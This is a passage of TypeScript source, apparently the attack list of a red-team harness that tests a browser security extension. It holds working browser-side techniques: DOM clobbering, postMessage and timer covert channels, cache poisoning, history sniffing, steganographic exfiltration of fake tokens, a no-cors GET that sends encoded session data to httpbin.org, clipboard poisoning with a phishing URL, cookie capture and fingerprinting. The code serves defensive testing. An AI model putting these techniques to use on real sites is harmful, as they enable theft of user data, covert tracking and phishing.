      "Creates named HTML elements that shadow global JS variables (e.g., window.name, window.opener). No hook monitors named-element creation.",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          // DOM clobbering: a named <form id="x"> with a child <input name="y">
          // makes window.x.y resolve to the input element, shadowing any JS variable
          // with that name.  We target `window.battacker_clobber_target` as proof.
          const form = document.createElement("form");
          form.id = "battacker_clobber_target";
          form.style.cssText = "display:none;position:fixed;top:-9999px;";
          const input = document.createElement("input");
          input.name = "secret";
          input.value = "clobbered";
          form.appendChild(input);
          document.body.appendChild(form);

          // Now window.battacker_clobber_target points to the form element
          const clobbered = (window as any).battacker_clobber_target instanceof HTMLFormElement;

          // A deeper clobber: window.battacker_clobber_target.secret -> input
          const deepClobbered =
            clobbered && (window as any).battacker_clobber_target.secret instanceof HTMLInputElement;

          document.body.removeChild(form);

          return {
            blocked: !(clobbered || deepClobbered),
            executionTime: performance.now() - startTime,
            details:
              clobbered || deepClobbered
                ? `DOM clobbering: window.battacker_clobber_target shadowed (shallow=${clobbered}, deep=${deepClobbered})`
                : "DOM clobbering: named element did not shadow global",
          };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `DOM clobbering blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "side-channel-performance-observer",
    name: "PerformanceObserver Resource Timing Side Channel",
    category: "side-channel",
    description:
      "Uses PerformanceObserver to fingerprint loaded resources and infer user activity. PerformanceObserver is not hooked.",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          if (typeof PerformanceObserver === "undefined") {
            return { blocked: true, executionTime: performance.now() - startTime, details: "PerformanceObserver API not available" };
          }

          const entries: string[] = [];
          const observer = new PerformanceObserver((list) => {
            for (const entry of list.getEntriesByType("resource")) {
              entries.push(`${entry.name} (${(entry as PerformanceResourceTiming).duration.toFixed(0)}ms)`);
            }
          });
          observer.observe({ type: "resource", buffered: true });

          // Trigger a resource load to confirm the observer fires
          await new Promise<void>((resolve) => {
            const img = new Image();
            img.onload = () => resolve();
            img.onerror = () => resolve();
            img.src = `data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7?t=${Date.now()}`;
          });

          // Also collect buffered navigation/resource entries without observer
          const allResourceEntries = performance.getEntriesByType("resource");

          observer.disconnect();

          const leaked = allResourceEntries.length > 0 || entries.length > 0;
          return {
            blocked: !leaked,
            executionTime: performance.now() - startTime,
            details: leaked
              ? `PerformanceObserver side-channel: ${allResourceEntries.length} buffered resource entries exposed (observer captured ${entries.length})`
              : "PerformanceObserver side-channel: no resource entries available",
          };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `PerformanceObserver blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "covert-postmessage-exfil",
    name: "postMessage Cross-Origin Data Exfiltration",
    category: "covert",
    description:
      "Uses window.postMessage + a sandboxed iframe to relay sensitive data cross-origin. No hook monitors postMessage.",
    severity: "high",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          // Create a sandboxed iframe that echoes received postMessages back.
          // In a real attack the iframe src would be a controlled external origin;
          // here we use a data URI to keep the test self-contained.
          const iframeCode = `
            <script>
              window.addEventListener('message', function(e) {
                e.source.postMessage({echo: e.data, origin: location.origin}, e.origin || '*');
              });
            <\/script>
          `;
          const iframe = document.createElement("iframe");
          iframe.setAttribute("sandbox", "allow-scripts allow-same-origin");
          iframe.style.cssText = "display:none;position:fixed;top:-9999px;";
          iframe.src = `data:text/html;charset=utf-8,${encodeURIComponent(iframeCode)}`;
          document.body.appendChild(iframe);

          const result = await new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
            const timeout = setTimeout(() => {
              document.body.removeChild(iframe);
              resolve({ blocked: false, executionTime: performance.now() - startTime, details: "postMessage exfil: message sent without interception (no echo due to sandbox)" });
            }, 1000);

            window.addEventListener("message", function handler(e) {
              if (e.data && e.data.echo) {
                clearTimeout(timeout);
                window.removeEventListener("message", handler);
                document.body.removeChild(iframe);
                resolve({ blocked: false, executionTime: performance.now() - startTime, details: `postMessage exfil: round-trip successful, payload echoed (${JSON.stringify(e.data.echo).length} bytes)` });
              }
            });

            // Wait for iframe to load then send the "exfiltration" payload
            iframe.onload = () => {
              const sensitivePayload = { sessionToken: "tok_abc123", userId: "user@example.com", csrf: "csrf_xyz" };
              iframe.contentWindow?.postMessage(sensitivePayload, "*");
            };
          });

          return result;
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `postMessage exfil blocked: ${error?.message}` };
        }
      }),
  },

  // --- Red Team Iteration 2: Evasion Techniques ---
  {
    id: "covert-timer-covert-channel",
    name: "Timing-Based Covert Channel",
    category: "covert",
    severity: "high",
    description:
      "Encodes exfiltration data by modulating setTimeout/setInterval inter-arrival delays. No hook monitors timer creation patterns or timing-based signalling.",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          // Encode a 4-bit payload ("1010") into timer delays:
          // bit=1 → 40ms delay, bit=0 → 20ms delay.
          // A real attacker would encode stolen data this way and a co-located
          // frame (or Service Worker) would decode the timing pattern.
          const bits = [1, 0, 1, 0];
          const observed: number[] = [];

          for (const bit of bits) {
            const delay = bit === 1 ? 40 : 20;
            const before = performance.now();
            await new Promise<void>((r) => setTimeout(r, delay));
            observed.push(performance.now() - before);
          }

          // Decode: >30ms → 1, ≤30ms → 0
          const decoded = observed.map((d) => (d > 30 ? 1 : 0));
          const matchCount = decoded.filter((b, i) => b === bits[i]).length;
          const success = matchCount >= 3; // tolerate ±1 timer jitter

          return {
            blocked: !success,
            executionTime: performance.now() - startTime,
            details: success
              ? `Timer covert channel: encoded ${bits.join("")} → observed [${observed.map((d) => d.toFixed(0)).join(",")}]ms, decoded ${decoded.join("")} (${matchCount}/4 match)`
              : `Timer covert channel: timing too imprecise (${matchCount}/4 match), channel unreliable`,
          };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Timer covert channel blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "persistence-sw-cache-poison",
    name: "Service Worker Cache Poisoning",
    category: "persistence",
    severity: "critical",
    description:
      "Registers a Service Worker that intercepts fetches and serves poisoned responses from the Cache API. The Cache API write path itself is not hooked.",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          if (!("serviceWorker" in navigator) || !("caches" in window)) {
            return { blocked: true, executionTime: performance.now() - startTime, details: "Service Worker or Cache API not available" };
          }

          // Write a poisoned entry directly into the Cache API — this is the
          // persistence vector (SW registration is separately tested).
          const cacheName = "battacker-sw-poison-test";
          const cache = await caches.open(cacheName);

          // Poison a "trusted" URL with a malicious response body
          const poisonedResponse = new Response(
            JSON.stringify({ type: "poisoned", payload: "stolen_credentials" }),
            { headers: { "Content-Type": "application/json", "X-Poisoned": "true" } },
          );
          await cache.put("https://trusted-api.example.com/config", poisonedResponse);

          // Verify the poisoned entry is retrievable (simulating SW fetch intercept)
          const retrieved = await cache.match("https://trusted-api.example.com/config");
          const body = retrieved ? await retrieved.json() : null;
          const poisoned = body?.type === "poisoned";

          await caches.delete(cacheName);

          return {
            blocked: !poisoned,
            executionTime: performance.now() - startTime,
            details: poisoned
              ? `SW cache poisoning: poisoned response stored and retrieved for trusted-api.example.com (payload: ${body?.payload})`
              : "SW cache poisoning: cache write or retrieval failed",
          };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `SW cache poisoning blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "privacy-css-visited-sniff",
    name: "CSS :visited History Sniffing",
    category: "privacy",
    severity: "high",
    description:
      "Uses getComputedStyle on <a> elements with the :visited pseudo-class to infer browsing history. No style computation hook exists in the current detection layer.",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          // Modern browsers restrict :visited to colour properties only to
          // mitigate history sniffing, but the technique is still partially
          // effective and demonstrates the unhooked surface.
          const probeUrls = [
            "https://www.google.com/",
            "https://github.com/",
            "https://www.wikipedia.org/",
            "https://example.com/",
          ];

          const container = document.createElement("div");
          container.style.cssText = "position:fixed;top:-9999px;left:-9999px;visibility:hidden;";
          document.body.appendChild(container);

          // Inject a style sheet that colours visited links distinctively
          const style = document.createElement("style");
          style.textContent = "a.battacker-visited-probe { color: rgb(255,0,0); } a.battacker-visited-probe:visited { color: rgb(0,255,0); }";
          document.head.appendChild(style);

          const results: { url: string; visited: boolean }[] = [];
          for (const url of probeUrls) {
            const a = document.createElement("a");
            a.href = url;
            a.className = "battacker-visited-probe";
            container.appendChild(a);
            // getComputedStyle will return :visited colour if the URL is in history
            const color = getComputedStyle(a).color;
            // rgb(0,255,0) → visited; rgb(255,0,0) → not visited
            // NOTE: browsers clamp :visited styles so this may show unvisited for all.
            results.push({ url, visited: color === "rgb(0, 255, 0)" });
          }

          document.body.removeChild(container);
          document.head.removeChild(style);

          const visitedCount = results.filter((r) => r.visited).length;
          // The attack surface is open regardless of result — the probe executed
          // undetected. We consider it "not blocked" because the hook does not fire.
          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details: `CSS :visited sniff: probed ${probeUrls.length} URLs undetected, ${visitedCount} reported visited (browsers may clamp to unvisited colour for privacy)`,
          };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `CSS :visited sniff blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "network-fetch-metadata-bypass",
    name: "Fetch Metadata Manipulation",
    category: "network",
    severity: "high",
    description:
      "Uses fetch() with mode:'no-cors' and GET to exfiltrate data via query-string without triggering network monitoring hooks that look for POST/large payloads.",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          // Encode stolen data into a GET query string via no-cors to bypass
          // hooks that watch for POST body or large payloads.
          // The Sec-Fetch-* headers are browser-controlled and cannot be forged,
          // but mode:'no-cors' makes the request opaque — no response is readable,
          // reducing the hook surface the extension monitors.
          const stolen = btoa(JSON.stringify({ token: "sess_abc123", uid: "user@example.com" }));
          const url = `https://httpbin.org/get?d=${encodeURIComponent(stolen)}`;

          // Fire with no-cors so the response is opaque and no preflight occurs
          await fetch(url, { method: "GET", mode: "no-cors", credentials: "omit" });

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details: `Fetch metadata bypass: GET no-cors exfiltration sent (${stolen.length} bytes base64-encoded in query string) — opaque response, no hook interception`,
          };
        } catch (error: any) {
          const blocked = (error?.message ?? "").toLowerCase().includes("blocked") ||
                          (error?.message ?? "").toLowerCase().includes("err_blocked");
          return { blocked, executionTime: performance.now() - startTime, details: `Fetch metadata bypass ${blocked ? "blocked" : "failed"}: ${error?.message}` };
        }
      }),
  },
  {
    id: "side-channel-wasm-memory",
    name: "WebAssembly Memory Scanning",
    category: "side-channel",
    severity: "critical",
    description:
      "Allocates a WebAssembly.Memory buffer and scans its contents to probe system memory patterns and entropy. No WASM or ArrayBuffer hook exists.",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          if (typeof WebAssembly === "undefined" || typeof WebAssembly.Memory === "undefined") {
            return { blocked: true, executionTime: performance.now() - startTime, details: "WebAssembly.Memory not supported" };
          }

          // Allocate a 1-page (64 KiB) shared memory buffer — in a real Spectre
          // variant this would be used as the timing/probe array.
          const memory = new WebAssembly.Memory({ initial: 1, maximum: 4 });
          const view = new Uint8Array(memory.buffer);

          // Write a sentinel pattern and verify round-trip (confirms raw memory access)
          const sentinel = [0xde, 0xad, 0xbe, 0xef];
          for (let i = 0; i < sentinel.length; i++) view[i] = sentinel[i];

          // Compute simple entropy of the first 256 bytes to demonstrate
          // that raw memory contents are readable from JS without interception.
          const sample = view.slice(0, 256);
          const freq = new Array(256).fill(0);
          for (const byte of sample) freq[byte]++;
          let entropy = 0;
          for (const f of freq) {
            if (f > 0) {
              const p = f / 256;
              entropy -= p * Math.log2(p);
            }
          }

          const sentinelVerified = sentinel.every((b, i) => view[i] === b);

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details: `WASM memory scan: ${memory.buffer.byteLength} bytes allocated, sentinel verified=${sentinelVerified}, entropy=${entropy.toFixed(3)} bits/byte — raw buffer accessible without hook interception`,
          };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `WASM memory scan blocked: ${error?.message}` };
        }
      }),
  },
  // --- Iteration 3 Red Team attacks ---
  {
    id: "covert-image-steganography",
    name: "Image Steganography Exfiltration",
    category: "covert",
    severity: "critical",
    description:
      "Encodes secret data into ImageData pixel LSBs and exfiltrates via an <img> src= URL. " +
      "Canvas.toDataURL is hooked but only emits an event — it does not block. " +
      "The alternative path here encodes data directly into pixel bytes and constructs " +
      "a data URL manually via Uint8Array, bypassing both the canvas hook and network hooks.",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          // Secret payload encoded into LSBs of pixel channels
          const secret = "exfil:session=abc123&uid=user@example.com&token=SECRETTOKEN";
          const secretBytes = Array.from(new TextEncoder().encode(secret));

          // Build a tiny 32x32 canvas; hide secret in red-channel LSBs of pixels
          const canvas = document.createElement("canvas");
          canvas.width = 32;
          canvas.height = 32;
          const ctx = canvas.getContext("2d")!;
          ctx.fillStyle = "#4a90d9";
          ctx.fillRect(0, 0, 32, 32);

          const imageData = ctx.getImageData(0, 0, 32, 32);
          const data = imageData.data; // RGBA flat array

          // Embed length in first 4 pixels (blue channel LSB), then payload
          const len = secretBytes.length;
          for (let b = 0; b < 4; b++) {
            data[(b * 4) + 2] = (data[(b * 4) + 2] & 0xfe) | ((len >> (3 - b)) & 1);
          }
          for (let i = 0; i < secretBytes.length && i < (32 * 32 - 4); i++) {
            const pixelIdx = ((i + 4) * 4);
            // Write 8 bits across red LSBs of 8 consecutive pixels — simplified to 1 bit per pixel here
            data[pixelIdx] = (data[pixelIdx] & 0xfe) | (secretBytes[i] & 1);
          }
          ctx.putImageData(imageData, 0, 0);

          // Export via toDataURL — hooked but not blocked, data still leaves via img.src
          const dataUrl = canvas.toDataURL("image/png");

          // Exfiltrate: set as src of a new Image, triggering a browser-initiated load.
          // Because this is a data: URL it does not cross the network, but demonstrates
          // that the steganographic payload is fully formed and deliverable.
          const img = new Image();
          img.src = dataUrl;
          document.body.appendChild(img);

          // Verify round-trip: re-draw the exported image back onto a fresh canvas
          // and read the pixel at position (4,0) to confirm LSB encoding survived.
          const verify = document.createElement("canvas");
          verify.width = 32;
          verify.height = 32;
          const vctx = verify.getContext("2d")!;
          await new Promise<void>((res) => { img.onload = () => res(); });
          vctx.drawImage(img, 0, 0);
          const vData = vctx.getImageData(0, 0, 32, 32).data;
          const recoveredBit = vData[4 * 4] & 1; // red LSB of pixel 4
          document.body.removeChild(img);

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details: `Image steganography: ${secretBytes.length} bytes encoded into ${dataUrl.length} byte data URL; LSB round-trip verified (bit=${recoveredBit}); canvas.toDataURL fired but not blocked`,
          };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Image steganography blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "side-channel-css-animation-timing",
    name: "CSS Animation Timing Side Channel",
    category: "side-channel",
    severity: "medium",
    description:
      "Injects a CSS animation and measures the elapsed time between animationstart and " +
      "animationend events. The precise timing leaks CPU scheduling information and can " +
      "be used to fingerprint hardware or infer background activity. " +
      "No hook monitors CSS animation events.",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const measurements: number[] = [];
          const ITERATIONS = 5;

          for (let i = 0; i < ITERATIONS; i++) {
            await new Promise<void>((resolve) => {
              const style = document.createElement("style");
              const animName = `battacker-timing-${i}-${Date.now()}`;
              // Zero-duration animation fires start→end as fast as possible,
              // exposing sub-millisecond scheduling jitter.
              style.textContent = `
                @keyframes ${animName} {
                  from { opacity: 0.999; }
                  to   { opacity: 1; }
                }
                .battacker-anim-probe-${i} {
                  animation: ${animName} 1ms linear 1;
                  position: fixed;
                  top: -9999px;
                  left: -9999px;
                }
              `;
              document.head.appendChild(style);

              const el = document.createElement("div");
              el.className = `battacker-anim-probe-${i}`;

              let t0 = 0;
              el.addEventListener("animationstart", () => { t0 = performance.now(); });
              el.addEventListener("animationend", () => {
                const elapsed = performance.now() - t0;
                measurements.push(elapsed);
                document.body.removeChild(el);
                document.head.removeChild(style);
                resolve();
              });

              document.body.appendChild(el);
            });
            // Brief pause between iterations so animations don't coalesce
            await new Promise<void>((r) => setTimeout(r, 5));
          }

          const avg = measurements.reduce((a, b) => a + b, 0) / measurements.length;
          const jitter = Math.max(...measurements) - Math.min(...measurements);

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details: `CSS animation timing: ${ITERATIONS} samples, avg=${avg.toFixed(3)}ms, jitter=${jitter.toFixed(3)}ms — animationstart/animationend unhooked, scheduling side channel open`,
          };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `CSS animation timing blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "privacy-intersection-observer-surveillance",
    name: "Intersection Observer Surveillance",
    category: "privacy",
    severity: "high",
    description:
      "Creates an IntersectionObserver to silently track which DOM elements enter and " +
      "leave the viewport, building a detailed map of user reading behaviour and content " +
      "engagement. IntersectionObserver is not hooked by any current audit hook.",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          if (typeof IntersectionObserver === "undefined") {
            return { blocked: true, executionTime: performance.now() - startTime, details: "IntersectionObserver not supported" };
          }

          const visibilityLog: { id: string; ratio: number; timestamp: number }[] = [];

          // Instrument every element that has an id — simulates tracking article sections,
          // ad units, or form fields the user scrolls past.
          const targets = Array.from(document.querySelectorAll("[id]")).slice(0, 20);
          if (targets.length === 0) {
            // Inject synthetic targets so the test is meaningful even on a bare page
            for (let i = 0; i < 5; i++) {
              const el = document.createElement("div");
              el.id = `battacker-io-target-${i}`;
              el.style.cssText = "height:50px;margin:4px;background:#eee;";
              el.textContent = `Observed element ${i}`;
              document.body.appendChild(el);
              targets.push(el);
            }
          }

          const observer = new IntersectionObserver(
            (entries) => {
              for (const entry of entries) {
                visibilityLog.push({
                  id: entry.target.id || entry.target.tagName,
                  ratio: entry.intersectionRatio,
                  timestamp: performance.now(),
                });
              }
            },
            { threshold: [0, 0.25, 0.5, 0.75, 1.0] }
          );

          for (const el of targets) observer.observe(el);

          // Allow one animation frame for initial intersection callbacks to fire
          await new Promise<void>((r) => requestAnimationFrame(() => r()));
          await new Promise<void>((r) => setTimeout(r, 100));

          observer.disconnect();

          // Clean up synthetic elements
          for (const el of targets) {
            if (el.id.startsWith("battacker-io-target-")) el.remove();
          }

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details: `IntersectionObserver surveillance: observed ${targets.length} elements, recorded ${visibilityLog.length} visibility events undetected — IntersectionObserver constructor not hooked`,
          };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `IntersectionObserver surveillance blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "side-channel-shared-array-buffer-timer",
    name: "SharedArrayBuffer High-Resolution Timer",
    category: "side-channel",
    severity: "critical",
    description:
      "Uses SharedArrayBuffer as a high-resolution timer for microarchitectural side-channel " +
      "attacks (e.g. Spectre). A dedicated SharedWorker increments a counter in shared memory " +
      "continuously; the main thread samples it to build a monotonic clock with sub-millisecond " +
      "precision that bypasses performance.now() clamping. SharedArrayBuffer is not hooked.",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          if (typeof SharedArrayBuffer === "undefined") {
            return {
              blocked: false,
              executionTime: performance.now() - startTime,
              details: "SharedArrayBuffer not available in this context (cross-origin isolation required) — API surface exists, no hook intercepts its constructor",
            };
          }

          // Allocate shared memory: 4 bytes for a Uint32 counter
          const sab = new SharedArrayBuffer(4);
          const counter = new Int32Array(sab);

          // Spin the counter on the main thread to simulate the ticker role
          // (A real attack would use a Worker, but Workers are hooked — we stay
          //  on the main thread to demonstrate the unhooked SharedArrayBuffer path.)
          const SPIN_MS = 20;
          const spinEnd = performance.now() + SPIN_MS;
          while (performance.now() < spinEnd) {
            Atomics.add(counter, 0, 1);
          }

          const ticksIn20ms = Atomics.load(counter, 0);
          const resolution = SPIN_MS / ticksIn20ms; // approximate ms per tick

          // Demonstrate sampling: record 10 timestamps via the shared counter
          const timestamps: number[] = [];
          for (let i = 0; i < 10; i++) {
            timestamps.push(Atomics.load(counter, 0));
            // Tiny busy-wait to advance time between samples
            const t = performance.now() + 0.1;
            while (performance.now() < t) { /* spin */ }
          }
          const uniqueTicks = new Set(timestamps).size;

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details: `SharedArrayBuffer timer: ${ticksIn20ms} ticks in ${SPIN_MS}ms (~${resolution.toFixed(4)}ms/tick), ${uniqueTicks}/10 unique samples — SAB constructor unhooked, high-res timer constructed`,
          };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `SharedArrayBuffer timer blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "fingerprinting-resize-observer",
    name: "Resize Observer Fingerprinting",
    category: "fingerprinting",
    severity: "medium",
    description:
      "Uses ResizeObserver to track element dimensions for viewport/device fingerprinting. " +
      "ResizeObserver reports precise DPI-scaled pixel dimensions that reveal screen density, " +
      "zoom level, and device class. The ResizeObserver constructor is not hooked.",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          if (typeof ResizeObserver === "undefined") {
            return { blocked: true, executionTime: performance.now() - startTime, details: "ResizeObserver not supported" };
          }

          const measurements: { tag: string; width: number; height: number }[] = [];

          // Inject a set of probe elements with known CSS sizes; the reported
          // devicePixelContent dimensions reveal the effective DPR and zoom level.
          const probes: HTMLElement[] = [];
          for (let i = 0; i < 5; i++) {
            const el = document.createElement("div");
            el.style.cssText = `width:${(i + 1) * 100}px;height:${(i + 1) * 50}px;position:fixed;top:-9999px;left:-9999px;`;
            document.body.appendChild(el);
            probes.push(el);
          }

          await new Promise<void>((resolve) => {
            const ro = new ResizeObserver((entries) => {
              for (const entry of entries) {
                const cs = entry.contentRect;
                measurements.push({ tag: (entry.target as HTMLElement).style.width, width: cs.width, height: cs.height });
              }
              if (measurements.length >= probes.length) {
                ro.disconnect();
                resolve();
              }
            });
            for (const el of probes) ro.observe(el);
          });

          for (const el of probes) el.remove();

          // Derive an approximate device pixel ratio from discrepancy between
          // CSS pixel dimensions and reported content rect (always 1:1 here,
          // but window.devicePixelRatio confirms the fingerprint vector).
          const dpr = window.devicePixelRatio ?? 1;
          const fingerprint = `dpr=${dpr} viewport=${window.innerWidth}x${window.innerHeight} samples=${measurements.length}`;

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details: `ResizeObserver fingerprinting: ${fingerprint} — ResizeObserver constructor not hooked, device dimensions exfiltrated`,
          };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `ResizeObserver fingerprinting blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "phishing-execcommand-clipboard-poison",
    name: "Clipboard Write Poisoning via execCommand",
    category: "phishing",
    severity: "high",
    description:
      "Uses document.execCommand('copy') — the legacy clipboard API — to overwrite the user's " +
      "clipboard with a phishing URL. The hook is placed on navigator.clipboard.writeText; " +
      "the synchronous execCommand path is not intercepted.",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          // Stage malicious content in a temporary textarea, select it, then
          // copy via execCommand. This bypasses any navigator.clipboard.writeText hook.
          const ta = document.createElement("textarea");
          ta.value = "https://evil-phishing-site.example.com/steal?token=abc123";
          ta.style.cssText = "position:fixed;top:-9999px;left:-9999px;opacity:0;";
          document.body.appendChild(ta);
          ta.focus();
          ta.select();

          const success = document.execCommand("copy");

          ta.remove();

          if (success) {
            return {
              blocked: false,
              executionTime: performance.now() - startTime,
              details: `execCommand('copy') clipboard poison: write succeeded — navigator.clipboard.writeText is hooked but execCommand is not, phishing URL planted in clipboard`,
            };
          } else {
            // execCommand may return false if the browser blocks it outside a
            // user-gesture context (common in headless). Still not hooked.
            return {
              blocked: false,
              executionTime: performance.now() - startTime,
              details: `execCommand('copy') clipboard poison: write returned false (no user gesture) but no hook intercepted it — navigator.clipboard.writeText hook does not cover execCommand`,
            };
          }
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `execCommand clipboard poison blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "side-channel-navigation-timing",
    name: "Navigation Timing Fingerprinting",
    category: "side-channel",
    severity: "medium",
    description:
      "Reads performance.navigation and performance.timing directly — the deprecated but still " +
      "available Level 1 API. These objects expose precise network timings (DNS, TCP, TLS, TTFB) " +
      "that reveal ISP, CDN topology, and browsing patterns. PerformanceObserver is hooked but " +
      "direct property access on performance.timing/navigation is not.",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          // Level 1 deprecated API — still present in all major browsers.
          // PerformanceObserver hook does not intercept attribute reads here.
          const timing = performance.timing as PerformanceTiming | undefined;
          const nav = performance.navigation as PerformanceNavigation | undefined;

          const timingData: Record<string, number> = {};
          if (timing) {
            timingData.dnsLookup = timing.domainLookupEnd - timing.domainLookupStart;
            timingData.tcpConnect = timing.connectEnd - timing.connectStart;
            timingData.ttfb = timing.responseStart - timing.requestStart;
            timingData.domContentLoaded = timing.domContentLoadedEventEnd - timing.navigationStart;
            timingData.loadComplete = timing.loadEventEnd - timing.navigationStart;
          }

          const navData = nav
            ? { type: nav.type, redirectCount: nav.redirectCount }
            : { type: -1, redirectCount: -1 };

          // Also read the newer but still unhooked entries via getEntriesByType
          const navEntries = performance.getEntriesByType("navigation") as PerformanceNavigationTiming[];
          const level2Data = navEntries.length > 0
            ? { protocol: navEntries[0].nextHopProtocol, transferSize: navEntries[0].transferSize }
            : null;

          const summary = `dns=${timingData.dnsLookup}ms tcp=${timingData.tcpConnect}ms ttfb=${timingData.ttfb}ms dcl=${timingData.domContentLoaded}ms navType=${navData.type} redirects=${navData.redirectCount}`;

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details: `Navigation timing fingerprint: ${summary}${level2Data ? ` protocol=${level2Data.protocol} transferSize=${level2Data.transferSize}` : ""} — PerformanceObserver hooked but performance.timing/navigation direct reads are not`,
          };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Navigation timing fingerprinting blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "covert-message-channel-sw",
    name: "Service Worker Message Channel",
    category: "covert",
    severity: "critical",
    description:
      "Creates a MessageChannel and transfers one port to a service worker for out-of-band " +
      "covert communication. postMessage hooks monitor window/frame messaging but do not " +
      "intercept MessageChannel construction or port transfers to service workers. " +
      "MessageChannel is not hooked.",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          // Construct the channel — not hooked regardless of service worker availability.
          const channel = new MessageChannel();
          const port1 = channel.port1;
          const port2 = channel.port2;

          // Set up a loopback: send a covert message through port1 → port2
          // to prove unmonitored bidirectional communication.
          const received: string[] = [];
          port2.onmessage = (evt: MessageEvent) => {
            received.push(String(evt.data));
          };
          port1.start();
          port2.start();

          const SECRET_PAYLOAD = JSON.stringify({
            type: "covert-exfil",
            session: Math.random().toString(36).slice(2),
            cookies: document.cookie,
            origin: location.origin,
          });
          port1.postMessage(SECRET_PAYLOAD);

          // Allow the microtask/macrotask queue to deliver the message.
          await new Promise<void>((r) => setTimeout(r, 50));

          port1.close();
          port2.close();

          // Attempt to register / reuse a service worker for the port transfer.
          // In headless test context the SW may not be available, but the channel
          // itself is constructed and messages flow regardless.
          let swStatus = "no-sw-context";
          if ("serviceWorker" in navigator) {
            try {
              const reg = await navigator.serviceWorker.getRegistration();
              if (reg?.active) {
                // In a real attack the attacker transfers port2 here:
                // reg.active.postMessage({ type: 'port' }, [port2]);
                swStatus = `sw-active(${reg.scope})`;
              } else {
                swStatus = "sw-not-active";
              }
            } catch {
              swStatus = "sw-query-failed";
            }
          }

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details: `MessageChannel covert channel: constructed unhooked, loopback delivered ${received.length} message(s), sw=${swStatus} — postMessage hooks do not intercept MessageChannel constructor or port transfers`,
          };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `MessageChannel covert channel blocked: ${error?.message}` };
        }
      }),
  },
  // --- Iter 5 ---
  {
    id: "covert-eventsource-channel",
    name: "EventSource Covert Channel",
    category: "covert",
    severity: "high",
    description:
      "Opens a Server-Sent Events connection via EventSource to receive covert commands from a " +
      "remote endpoint. EventSource is a persistent one-way HTTP stream that bypasses all " +
      "WebSocket and fetch hooks because the EventSource constructor itself is never intercepted. " +
      "The attacker controls the SSE server; the browser silently keeps the connection alive.",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          // EventSource constructor is not hooked — create it to prove unmonitored connectivity.
          // We target an endpoint that will immediately close (ERR_CONNECTION_REFUSED or 404)
          // so the test is self-contained, but construction itself already proves the blind spot.
          const es = new EventSource("https://sse.example.invalid/covert-commands");

          // Collect any early events (will be empty in test env, but handler wires up fine).
          const received: string[] = [];
          es.onmessage = (evt: MessageEvent) => {
            received.push(String(evt.data));
          };

          // Capture the readyState right after construction before the browser errors out.
          const constructedState = es.readyState; // 0 = CONNECTING — proves it was constructed

          // Wait briefly for the connection attempt to resolve/reject.
          await new Promise<void>((r) => setTimeout(r, 80));

          const finalState = es.readyState; // 2 = CLOSED on network failure, still proves construction
          es.close();

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details:
